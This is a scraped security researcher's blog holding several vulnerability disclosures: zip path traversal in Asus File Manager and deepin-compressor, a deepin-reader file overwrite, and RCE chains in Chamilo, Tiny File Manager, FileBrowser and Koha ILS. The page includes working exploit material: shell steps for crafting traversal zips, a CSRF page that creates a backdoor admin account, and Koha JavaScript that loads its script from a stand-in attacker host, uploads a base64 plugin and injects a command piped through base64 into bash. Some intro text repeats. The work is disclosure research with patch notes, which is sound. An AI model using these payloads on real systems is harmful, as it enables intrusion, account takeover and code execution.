
Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [CVE-2021-40662 Chamilo LMS 1.11.14 RCE](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/)

[22nd March 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/03/exploit-300x157-1.jpg?w=300)

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

<https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-79-2021-07-17-Moderate-impact-Low-risk-CSRF-in-global-chat-and-social-wall>

**Disclosure Timeline:**

July 27, 2021 – Contacted the vendor and reported the vulnerability

July 28, 2021 – Vendor replies back

August 2, 2021 – Vulnerability has been patched in version **1.11.16**

March 21, 2022 – CVE ID was assigned. CVE-2021-40662

**CVE Description**: *Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker’s profile page.*

* One-Click Technique: An Attacker who has a student account can create a malicious web page or a malicious SVG image file and upload the file to the “My Productions” section of the student profile page, then he can copy the URL of that file and send it to the Chamilo Admin User. When the Admin user loads the file in his browser with an active chamilo session, in the background it will upload a plugin (.zip file) to chamilo. Then the attacker can simply navigate to /plugin/exploited-directory/ and execute malicious commands.
* “Zero Click” technique: In this case, the attacker abuses the “My Diplomas” feature and injects malicious javascript in it, and when the Admin visits the Attacker’s (student) profile page or Portfolio, the malicious javascript gets executed and the malicious plugin gets uploaded to the server. After that, the attacker can simply navigate to /plugin/exploit/ directory and execute the shell.php script and execute arbitrary commands. Advantages of this exploit: No need to upload a malicious file to /app/upload/users/ directory , No need to send a link or URL to the Admin. When the admin visits attacker’s profile, the attacker gets the RCE 😉 .

**Reference**: <https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE>

**Video Reference**:

<https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/raw/main/chamilo_csrf-rce_exploit.mp4>

**Exploit Code:** <https://raw.githubusercontent.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/main/zero-click.ht>

**Remediation:**

The Vulnerability has been patched from version 1.11.16

[<https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9>](https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9)

Thanks

# [Tiny File Manager Authenticated RCE](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

[23rd January 202215th March 2022](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/#respond)

**CVE-2021-45010**

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named “[Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)“. While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability.

**Disclosure Timeline:**

A similar Vulnerability was also reported by another researcher named “Omri Inbar”.

My disclosure timeline:

September 16, 2021 – Contacted the developer and reported the vulnerability

September 17, 2021 – Developer replies back

September 20, 2021 – Developer verified the issue

September 26, 2021 – I patched the source code, fixed the RCE, and sent a pull request to the original repository.

November 12, 2021 – The developer merged the commit. The vulnerability has been fixed.

**CVE-2021-45010**: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.3 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.

**Vendor/Software Details**

TinyFileManager is a web-based file manager and it is a simple, fast, and small file manager with a single file, a multi-language ready web application for storing, uploading, editing, and managing files and folders online via the web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and build-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Link: <https://github.com/prasathmani/tinyfilemanager>

**Authenticated RCE**

Tiny File Manager is a php based software. This particular vulnerability is present in the tinyfilemanager.php script. When the user logs in to the application, he is allowed to upload, download, edit files and those file are stored in a specific directory which is been specified in “config.php”. The particular vulnerability that I have found allows the user to upload files beyond the specified directory by tampering the “fullpath” parameter and add a bunch of “../” in front of the actual filename thus leads to breaking out of the file root directory that is specified in config.php.

This can be exploited to place php web-shells inside the web root directory of Tiny File Manager and achieve RCE.

Proof Of Concept:

*RCE*
1. An Attacker who has admin credentials or admin access to “Tiny FIle manager” app can upload arbitrary files to the server via Path Traversal i.e, appending “../../../../../../../” to the “fullpath parameter in the upload feature.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce.png?w=1024)

2. If the attacker could get the full Web Root directory of the “Tiny File Manager” app, he could upload php files there to achieve RCE.

3. To get the full Webroot directory path, we can abuse a path disclosure vulnerability in the URL upload feature. When a random rubbish URL is given as input, it throws an error message that reveals the full Webroot directory path.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_disclose.png?w=1024)

4. By combining these, we can achieve Command execution on the server.

I created an exploit script that automatically exploits the bug and get a shell:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce3.png?w=1024)

Download the Exploit: *<https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh>*

**The Patch:**

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA=w484-h87)](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA%3Ds1232)

<https://github.com/prasathmani/tinyfilemanager/pull/636/files/a93fc321a3c89fdb9bee860bf6df5d89083298d1>

👉  *Replace “./” with “\_” fixes the issue.*

**Thank You**

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F01%2F17%2Fcve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F01%2F17%2Fcve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_44e0f986_20250115_123738.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Hacking

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
